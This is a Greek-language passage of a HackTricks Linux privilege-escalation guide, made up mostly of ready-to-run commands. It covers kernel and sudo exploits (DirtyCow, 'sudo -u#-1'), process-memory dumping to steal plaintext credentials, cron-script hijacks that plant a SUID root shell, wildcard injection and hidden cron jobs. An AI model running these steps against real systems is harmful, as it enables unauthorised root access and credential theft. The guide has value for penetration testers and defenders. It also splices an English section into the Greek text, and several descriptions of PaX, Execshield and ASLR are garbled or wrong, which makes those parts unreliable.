# Ανέβασμα Προνομιακών Δικαιωμάτων στο Linux

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Πληροφορίες Συστήματος

### Πληροφορίες Λειτουργικού Συστήματος

Ας ξεκινήσουμε αποκτώντας κάποιες γνώσεις για το λειτουργικό σύστημα που εκτελείται.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Διαδρομή

Εάν **έχετε δικαιώματα εγγραφής σε οποιοδήποτε φάκελο μέσα στη μεταβλητή `PATH`**, μπορεί να είστε σε θέση να αποκτήσετε έλεγχο επάνω σε ορισμένες βιβλιοθήκες ή δυαδικά αρχεία:
```bash
echo $PATH
```
### Πληροφορίες περιβάλλοντος

Ενδιαφέρουσες πληροφορίες, κωδικοί πρόσβασης ή κλειδιά API στις μεταβλητές περιβάλλοντος;
```bash
(env || set) 2>/dev/null
```
### Εκμεταλλεύσεις πυρήνα

Ελέγξτε την έκδοση του πυρήνα και αν υπάρχει κάποια εκμετάλλευση που μπορεί να χρησιμοποιηθεί για την ανέλιξη προνομίων
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Μπορείτε να βρείτε μια καλή λίστα ευπαθών πυρήνων και μερικά ήδη **μεταγλωττισμένα exploits** εδώ: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) και [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
Άλλες ιστοσελίδες όπου μπορείτε να βρείτε μερικά **μεταγλωττισμένα exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Για να εξαγάγετε όλες τις ευπαθείς εκδόσεις πυρήνα από αυτήν την ιστοσελίδα, μπορείτε να κάνετε:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Εργαλεία που μπορούν να βοηθήσουν στην αναζήτηση για εκμεταλλεύσεις πυρήνα είναι:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (εκτελέστε ΣΤΟ θύμα, ελέγχει μόνο εκμεταλλεύσεις για πυρήνα 2.x)

Πάντα **αναζητήστε την έκδοση του πυρήνα στο Google**, ίσως η έκδοση του πυρήνα σας να είναι γραμμένη σε κάποια εκμετάλλευση πυρήνα και έτσι θα είστε σίγουροι ότι αυτή η εκμετάλλευση είναι έγκυρη.

### CVE-2016-5195 (DirtyCow)

Ανόδου Προνομίων στο Linux - Πυρήνας Linux <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Έκδοση Sudo

Βασισμένο στις ευάλωτες εκδόσεις του sudo που εμφανίζονται στο:
```bash
searchsploit sudo
```
Μπορείτε να ελέγξετε εάν η έκδοση του sudo είναι ευάλωτη χρησιμοποιώντας αυτήν την εντολή grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Από τον χρήστη @sickrov
```
sudo -u#-1 /bin/bash
```
### Αποτυχία επαλήθευσης υπογραφής Dmesg

Ελέγξτε το **smasher2 box του HTB** για ένα **παράδειγμα** πώς μπορεί να εκμεταλλευτεί αυτή η ευπάθεια.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Περισσότερη αναγνώριση του συστήματος

In this section, we will explore additional techniques for system enumeration that can help us gather more information about the target system.

#### 1. Checking for SUID/SGID binaries

SUID (Set User ID) and SGID (Set Group ID) are special permissions that can be assigned to executable files. When a binary with SUID/SGID permissions is executed, it runs with the privileges of the file owner/group instead of the user executing it. This can potentially lead to privilege escalation if misconfigured or vulnerable binaries are found.

To check for SUID/SGID binaries, we can use the following command:

```bash
find / -perm -4000 -type f 2>/dev/null
```

This command will search the entire filesystem (`/`) for files with the SUID permission (`-perm -4000`) and display the results. The `2>/dev/null` part is used to suppress any error messages.

#### 2. Checking for writable directories

Writable directories can be potential targets for privilege escalation. By placing a malicious executable in a writable directory, an attacker can trick the system into executing it with elevated privileges.

To find writable directories, we can use the following command:

```bash
find / -writable -type d 2>/dev/null
```

This command will search the entire filesystem (`/`) for directories that are writable (`-writable`) and display the results.

#### 3. Checking for world-writable files

World-writable files are files that can be modified by any user on the system. These files can be exploited to gain unauthorized access or escalate privileges.

To find world-writable files, we can use the following command:

```bash
find / -perm -2 -type f 2>/dev/null
```

This command will search the entire filesystem (`/`) for files with the write permission for all users (`-perm -2`) and display the results.

#### 4. Checking for cron jobs

Cron jobs are scheduled tasks that run automatically at specified intervals. Malicious cron jobs can be used to maintain persistence on a compromised system.

To check for cron jobs, we can use the following command:

```bash
ls -la /etc/cron* /etc/at* 2>/dev/null
```

This command will list the contents of the `/etc/cron*` and `/etc/at*` directories, which contain the cron jobs and at jobs respectively.

By performing these additional system enumeration techniques, we can gather more information about the target system and identify potential avenues for privilege escalation.
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Απαρίθμηση πιθανών αμυνών

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity

Το Grsecurity είναι ένα πακέτο ασφαλείας για τον πυρήνα του Linux που παρέχει πρόσθετες λειτουργίες ασφαλείας και προστασίας. Αυτό το πακέτο προσφέρει μια σειρά από μέτρα για την ενίσχυση της ασφάλειας του συστήματος, όπως περιορισμός των δικαιωμάτων των χρηστών, προστασία από επιθέσεις buffer overflow και προστασία από εκτελέσιμα αρχεία με κακόβουλο κώδικα.

Η εγκατάσταση του Grsecurity μπορεί να είναι μια αποτελεσματική μέθοδος για την ενίσχυση της ασφάλειας του συστήματος σας. Ωστόσο, πρέπει να ληφθούν υπόψη ορισμένα πράγματα πριν από την εγκατάσταση του, όπως η συμβατότητα με τον πυρήνα του Linux που χρησιμοποιείτε και η δυνατότητα αντιμετώπισης προβλημάτων συμβατότητας με άλλα πακέτα λογισμικού.

Για να εγκαταστήσετε το Grsecurity, ακολουθήστε τις οδηγίες που παρέχονται από τον προμηθευτή του πακέτου. Μετά την εγκατάσταση, μπορείτε να προσαρμόσετε τις ρυθμίσεις του Grsecurity για να προσφέρετε επιπλέον προστασία στο σύστημά σας.
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX

Το PaX είναι ένα σύστημα ασφαλείας για τον πυρήνα του Linux που παρέχει πρόσθετες προστασίες για την αποτροπή εκμετάλλευσης ευπαθειών. Χρησιμοποιεί την τεχνική του κατανεμημένου ελέγχου πρόσβασης (Distributed Access Control) για να περιορίσει τις δυνατότητες εκτέλεσης κώδικα από επιθέσεις.

Το PaX υλοποιεί διάφορες τεχνικές, όπως την ανάθεση δικαιωμάτων εκτέλεσης μόνο σε εκτελέσιμα αρχεία, την απαγόρευση της εκτέλεσης κώδικα από περιοχές μνήμης που είναι εγγενώς μη εκτελέσιμες, και την προστασία από buffer overflows και άλλες ευπάθειες.

Η χρήση του PaX μπορεί να βοηθήσει στην ενίσχυση της ασφάλειας του συστήματος Linux και στην πρόληψη της ανεξουσιότητας δικαιωμάτων (privilege escalation) από επιθέσεις.
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield

Το Execshield είναι μια τεχνική που χρησιμοποιείται για την ενίσχυση της ασφάλειας στο Linux. Αποτρέπει την εκτέλεση κακόβουλου κώδικα με τη χρήση μιας σειράς μηχανισμών προστασίας. Οι μηχανισμοί αυτοί περιλαμβάνουν την απενεργοποίηση της εκτέλεσης κώδικα από περιοχές μνήμης που είναι ετικετοποιημένες ως εκτελέσιμες, την προστασία από buffer overflows και την αποτροπή της εκτέλεσης κώδικα από μη εκτελέσιμες περιοχές μνήμης.

Ο Execshield μπορεί να ενεργοποιηθεί στον πυρήνα Linux με τη χρήση των παραμέτρων του πυρήνα `kernel.exec-shield` και `kernel.randomize_va_space`. Η παράμετρος `kernel.exec-shield` ελέγχει την ενεργοποίηση του Execshield, ενώ η παράμετρος `kernel.randomize_va_space` αλλάζει την τοποθεσία των περιοχών μνήμης κατά την εκκίνηση του πυρήνα, προσθέτοντας έναν επιπλέον μηχανισμό προστασίας.

Η χρήση του Execshield μπορεί να βοηθήσει στην πρόληψη εκμετάλλευσης ευπαθειών στο λειτουργικό σύστημα Linux και να αυξήσει την ασφάλεια του συστήματος.
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux

Το SElinux (Security-Enhanced Linux) είναι ένα μηχανισμός ασφαλείας για τον έλεγχο πρόσβασης στο Linux σύστημα. Χρησιμοποιείται για την εφαρμογή πολιτικών ασφαλείας που περιορίζουν τις ενέργειες που μπορούν να πραγματοποιήσουν οι χρήστες και οι εφαρμογές στο σύστημα. Οι πολιτικές ασφαλείας του SElinux ορίζουν τους κανόνες για το ποιες ενέργειες επιτρέπονται και ποιες απαγορεύονται, προστατεύοντας έτσι το σύστημα από πιθανές επιθέσεις προνομιούχων αυξήσεων. 

Οι πολιτικές ασφαλείας του SElinux ορίζονται από τον διαχειριστή του συστήματος και μπορούν να προσαρμοστούν για να ανταποκριθούν στις απαιτήσεις ασφαλείας του συγκεκριμένου περιβάλλοντος. Οι πολιτικές ασφαλείας του SElinux παρέχουν ένα επιπλέον επίπεδο προστασίας για το σύστημα, εμποδίζοντας την ανεξουσιότητα και την εκμετάλλευση ευπάθειών.
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR

Η Αυτόματη Τυχαία Τοποθέτηση Χώρου Μνήμης (ASLR) είναι μια τεχνική που χρησιμοποιείται για την αποτροπή εκμετάλλευσης ευπαθειών στον χώρο μνήμης. Η ASLR λειτουργεί τυχαία τοποθετώντας τις βιβλιοθήκες, τις στοίβες και τις περιοχές μνήμης των εφαρμογών σε διαφορετικές διευθύνσεις κατά την εκκίνηση. Αυτό καθιστά δυσκολότερη την εκμετάλλευση ευπαθειών, καθώς οι επιθέσεις πρέπει να γνωρίζουν τις σωστές διευθύνσεις μνήμης για να επιτύχουν την εκτέλεση κακόβουλου κώδικα.

Η ASLR μπορεί να ενεργοποιηθεί στον πυρήνα Linux με τη χρήση του αρχείου `/proc/sys/kernel/randomize_va_space`. Όταν η τιμή του αρχείου είναι `2`, η ASLR είναι πλήρως ενεργοποιημένη. Επίσης, μπορεί να ρυθμιστεί για να εφαρμόζεται μόνο σε συγκεκριμένες περιοχές μνήμης, χρησιμοποιώντας το αρχείο `/proc/sys/kernel/randomize_va_space`.

Για να επιτευχθεί προνομιούχος ανέλιξη με τη χρήση της ASLR, ο επιτιθέμενος πρέπει να ανακαλύψει τις τυχαίες διευθύνσεις μνήμης των εφαρμογών. Αυτό μπορεί να γίνει με την εκτέλεση επιθέσεων όπως το buffer overflow ή το format string vulnerability.
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Διαφυγή από το Docker

Εάν βρίσκεστε μέσα σε ένα container Docker, μπορείτε να προσπαθήσετε να διαφύγετε από αυτό:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Οδοί αποθήκευσης

Ελέγξτε **τι είναι προσαρτημένο και αποσυναρμολογημένο**, πού και γιατί. Εάν κάτι είναι αποσυναρμολογημένο, μπορείτε να προσπαθήσετε να το προσαρτήσετε και να ελέγξετε για προσωπικές πληροφορίες.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Χρήσιμο λογισμικό

Απαριθμήστε χρήσιμες δυαδικές εφαρμογές
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Επίσης, ελέγξτε αν **έχει εγκατασταθεί κάποιος μεταγλωττιστής**. Αυτό είναι χρήσιμο αν χρειάζεστε να χρησιμοποιήσετε κάποιο εκμεταλλευτή πυρήνα, καθώς συνιστάται να τον μεταγλωττίσετε στο μηχάνημα όπου πρόκειται να τον χρησιμοποιήσετε (ή σε ένα παρόμοιο).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Ευάλωτο Λογισμικό Που Έχει Εγκατασταθεί

Ελέγξτε τη **έκδοση των εγκατεστημένων πακέτων και υπηρεσιών**. Ίσως υπάρχει μια παλιά έκδοση του Nagios (για παράδειγμα) που μπορεί να εκμεταλλευτεί για την ανέλιξη προνομίων...\
Συνιστάται να ελέγξετε χειροκίνητα την έκδοση του πιο ύποπτου εγκατεστημένου λογισμικού.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Εάν έχετε πρόσβαση SSH στη μηχανή, μπορείτε επίσης να χρησιμοποιήσετε το **openVAS** για να ελέγξετε αν υπάρχουν παλαιές και ευάλωτες εγκατεστημένες εφαρμογές μέσα στη μηχανή.

{% hint style="info" %}
_Σημειώστε ότι αυτές οι εντολές θα εμφανίσουν πολλές πληροφορίες που θα είναι κυρίως άχρηστες, για αυτό συνιστάται η χρήση ορισμένων εφαρμογών όπως το OpenVAS ή παρόμοιες που θα ελέγξουν εάν οποιαδήποτε εγκατεστημένη έκδοση λογισμικού είναι ευάλωτη σε γνωστές εκμεταλλεύσεις_
{% endhint %}

## Διεργασίες

Ρίξτε μια ματιά σε **ποιες διεργασίες** εκτελούνται και ελέγξτε εάν κάποια διεργασία έχει **περισσότερα δικαιώματα από ό,τι θα έπρεπε** (ίσως ένα tomcat που εκτελείται από τον root;)
```bash
ps aux
ps -ef
top -n 1
```
Πάντα ελέγχετε για πιθανούς [**αποσφαλματωτές electron/cef/chromium** που εκτελούνται, μπορείτε να τους καταχραστείτε για να αναβαθμίσετε τα δικαιώματα](electron-cef-chromium-debugger-abuse.md). Το **Linpeas** τους ανιχνεύει ελέγχοντας την παράμετρο `--inspect` μέσα στη γραμμή εντολών της διεργασίας.\
Επίσης, **ελέγξτε τα δικαιώματά σας στα δυαδικά αρχεία των διεργασιών**, ίσως μπορείτε να αντικαταστήσετε κάποιον.

### Παρακολούθηση διεργασιών

Μπορείτε να χρησιμοποιήσετε εργαλεία όπως το [**pspy**](https://github.com/DominicBreuker/pspy) για να παρακολουθείτε διεργασίες. Αυτό μπορεί να είναι πολύ χρήσιμο για την εντοπισμό ευάλωτων διεργασιών που εκτελούνται συχνά ή όταν πληρούνται ορισμένες απαιτήσεις.

### Μνήμη διεργασιών

Ορισμένες υπηρεσίες ενός διακομιστή αποθηκεύουν **διαπιστευτήρια σε καθαρό κείμενο μέσα στη μνήμη**.\
Συνήθως θα χρειαστείτε **δικαιώματα ρίζας** για να διαβάσετε τη μνήμη διεργασιών που ανήκουν σε άλλους χρήστες, επομένως αυτό είναι συνήθως πιο χρήσιμο όταν ήδη είστε ροοτ και θέλετε να ανακαλύψετε περισσότερα διαπιστευτήρια.\
Ωστόσο, θυμηθείτε ότι **ως κανονικός χρήστης μπορείτε να διαβάσετε τη μνήμη των διεργασιών που σας ανήκουν**.

{% hint style="warning" %}
Σημειώστε ότι σήμερα οι περισσότερες μηχανές **δεν επιτρέπουν το ptrace από προεπιλογή**, πράγμα που σημαίνει ότι δεν μπορείτε να αντλήσετε άλλες διεργασίες που ανήκουν στο μη εξουσιοδοτημένο χρήστη σας.

Το αρχείο _**/proc/sys/kernel/yama/ptrace\_scope**_ ελέγχει την προσβασιμότητα του ptrace:

* **kernel.yama.ptrace\_scope = 0**: όλες οι διεργασίες μπορούν να αποσφαλματωθούν, υπό την προϋπόθεση ότι έχουν τον ίδιο uid. Αυτό είναι το κλασικό τρόπο που λειτουργούσε το ptracing.
* **kernel.yama.ptrace\_scope = 1**: μόνο μια γονική διεργασία μπορεί να αποσφαλματωθεί.
* **kernel.yama.ptrace\_scope = 2**: Μόνο ο διαχειριστής μπορεί να χρησιμοποιήσει το ptrace, καθώς απαιτείται η δυνατότητα CAP\_SYS\_PTRACE.
* **kernel.yama.ptrace\_scope = 3**: Δεν μπορούν να παρακολουθηθούν διεργασίες με το ptrace. Μόλις οριστεί, απαιτείται επανεκκίνηση για να ενεργοποιηθεί ξανά το ptracing.
{% endhint %}

#### GDB

Εάν έχετε πρόσβαση στη μνήμη μιας υπηρεσίας FTP (για παράδειγμα), μπορείτε να ανακτήσετε το Heap και να αναζητήσετε μέσα σε αυτό τα διαπιστευτήρια.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Σενάριο GDB

{% code title="dump-memory.sh" %}
```bash
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
{% endcode %}

#### /proc/$pid/maps & /proc/$pid/mem

Για ένα συγκεκριμένο αναγνωριστικό διεργασίας (PID), το αρχείο **maps δείχνει πώς είναι αντιστοιχισμένη η μνήμη μέσα στον εικονικό χώρο διευθύνσεων** αυτής της διεργασίας· επίσης δείχνει τις **άδειες πρόσβασης κάθε αντιστοιχισμένης περιοχής**. Το ψευδώνυμο αρχείο **mem αποκαλύπτει την ίδια τη μνήμη των διεργασιών**. Από το αρχείο **maps γνωρίζουμε ποιες περιοχές μνήμης είναι αναγνώσιμες** και τις μετατοπίσεις τους. Χρησιμοποιούμε αυτές τις πληροφορίες για να **αναζητήσουμε στο αρχείο mem και να αποθηκεύσουμε όλες τις αναγνώσιμες περιοχές σε ένα αρχείο**.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

Το `/dev/mem` παρέχει πρόσβαση στην **φυσική** μνήμη του συστήματος, όχι στην εικονική μνήμη. Ο εικονικός χώρος διευθύνσεων του πυρήνα μπορεί να προσπελαστεί χρησιμοποιώντας το `/dev/kmem`.\
Συνήθως, το `/dev/mem` είναι μόνο για ανάγνωση από τον **root** και την ομάδα **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump για Linux

Το ProcDump είναι μια εκδοχή για Linux του κλασικού εργαλείου ProcDump από το σύνολο εργαλείων Sysinternals για τα Windows. Βρείτε το στο [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Εργαλεία

Για να αντλήσετε τη μνήμη ενός διεργασίας μπορείτε να χρησιμοποιήσετε:

* [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Μπορείτε να αφαιρέσετε χειροκίνητα τις απαιτήσεις ρίζας και να αντλήσετε τη διεργασία που σας ανήκει
* Σενάριο A.5 από το [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (απαιτείται ρίζα)

### Διαπιστευτήρια από τη Μνήμη της Διεργασίας

#### Παράδειγμα χειροκίνητης διαδικασίας

Εάν ανακαλύψετε ότι η διεργασία του αυθεντικοποιητή εκτελείται:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Μπορείτε να αντλήσετε τη διαδικασία (δείτε τις προηγούμενες ενότητες για να βρείτε διάφορους τρόπους για να αντλήσετε τη μνήμη μιας διαδικασίας) και να αναζητήσετε διαπιστευτήρια μέσα στη μνήμη:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Το εργαλείο [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) θα **κλέψει διαπιστευτήρια καθαρού κειμένου από τη μνήμη** και από ορισμένα **γνωστά αρχεία**. Απαιτεί δικαιώματα root για να λειτουργήσει σωστά.

| Χαρακτηριστικό                                      | Όνομα Διεργασίας      |
| ------------------------------------------------- | -------------------- |
| Κωδικός GDM (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Ενεργές συνδέσεις FTP)                   | vsftpd               |
| Apache2 (Ενεργές συνεδρίες HTTP Basic Auth)         | apache2              |
| OpenSSH (Ενεργές συνεδρίες SSH - Χρήση Sudo)        | sshd:                |

#### Αναζήτηση Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Προγραμματισμένες/Cron εργασίες

Ελέγξτε εάν υπάρχει κάποια ευπάθεια σε προγραμματισμένες εργασίες. Ίσως μπορείτε να εκμεταλλευτείτε ένα σενάριο που εκτελείται από τον ριζικό χρήστη (ευπάθεια με χρήση μπαλαντέρ; μπορείτε να τροποποιήσετε αρχεία που χρησιμοποιεί ο ριζικός χρήστης; χρήση συμβολικών συνδέσμων; δημιουργία συγκεκριμένων αρχείων στον κατάλογο που χρησιμοποιεί ο ριζικός χρήστης;).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Διαδρομή Cron

Για παράδειγμα, μέσα στο _/etc/crontab_ μπορείτε να βρείτε τη ΔΙΑΔΡΟΜΗ: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Παρατηρήστε πώς ο χρήστης "user" έχει δικαιώματα εγγραφής στο /home/user_)

Αν μέσα σε αυτό το crontab ο χρήστης root προσπαθήσει να εκτελέσει κάποια εντολή ή script χωρίς να ορίσει τη διαδρομή. Για παράδειγμα: _\* \* \* \* root overwrite.sh_\
Τότε, μπορείτε να αποκτήσετε ένα root shell χρησιμοποιώντας:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Χρονοδιακοπτής χρησιμοποιώντας ένα σενάριο με μπαλαντέρ (Wildcard Injection)

Εάν ένα σενάριο εκτελείται από τον ριζικό χρήστη και περιέχει τον χαρακτήρα "**\***" μέσα σε μια εντολή, μπορείτε να εκμεταλλευτείτε αυτό για να προκαλέσετε απρόσμενα πράγματα (όπως ανέλιξη προνομίων). Παράδειγμα:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Εάν το αντίστοιχο μπαλαντέρ προηγείται από ένα μονοπάτι όπως** _**/some/path/\***_ **, δεν είναι ευάλωτο (ακόμη και το** _**./\***_ **δεν είναι).**

Διαβάστε την ακόλουθη σελίδα για περισσότερα κόλπα εκμετάλλευσης των μπαλαντέρ:

{% content-ref url="wildcards-spare-tricks.md" %}
[wildcards-spare-tricks.md](wildcards-spare-tricks.md)
{% endcontent-ref %}

### Αντικατάσταση και σύνδεση συμβολικού συνδέσμου σε σενάριο Cron

Εάν **μπορείτε να τροποποιήσετε ένα σενάριο Cron** που εκτελείται από τον ριζικό χρήστη, μπορείτε να αποκτήσετε πολύ εύκολα ένα κέλυφος:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Εάν το σενάριο που εκτελείται από τον ριζικό χρήστη χρησιμοποιεί ένα **κατάλογο στον οποίο έχετε πλήρη πρόσβαση**, ίσως είναι χρήσιμο να διαγράψετε αυτόν τον φάκελο και να **δημιουργήσετε έναν συμβολικό σύνδεσμο σε έναν άλλο φάκελο** που εξυπηρετεί ένα σενάριο που ελέγχετε εσείς.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Συχνές εργασίες cron

Μπορείτε να παρακολουθείτε τις διεργασίες για να αναζητήσετε διεργασίες που εκτελούνται κάθε 1, 2 ή 5 λεπτά. Ίσως μπορείτε να εκμεταλλευτείτε αυτό και να αυξήσετε τα προνόμια.

Για παράδειγμα, για να **παρακολουθήσετε κάθε 0,1 δευτερόλεπτα για 1 λεπτό**, **ταξινομήστε ανά λιγότερο εκτελούμενες εντολές** και διαγράψτε τις εντολές που έχουν εκτελεστεί περισσότερες φορές, μπορείτε να κάνετε:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Μπορείτε επίσης να χρησιμοποιήσετε** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (αυτό θα παρακολουθεί και θα καταγράφει κάθε διεργασία που ξεκινά).

### Αόρατες εργασίες cron

Είναι δυνατόν να δημιουργήσετε μια εργασία cron **τοποθετώντας έναν χαρακτήρα αλλαγής γραμμής μετά από ένα σχόλιο** (χωρίς χαρακτήρα νέας γραμμής), και η εργασία cron θα λειτουργήσει. Παράδειγμα (σημειώστε τον χαρακτήρα αλλαγής γραμμής):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Υπηρεσίες

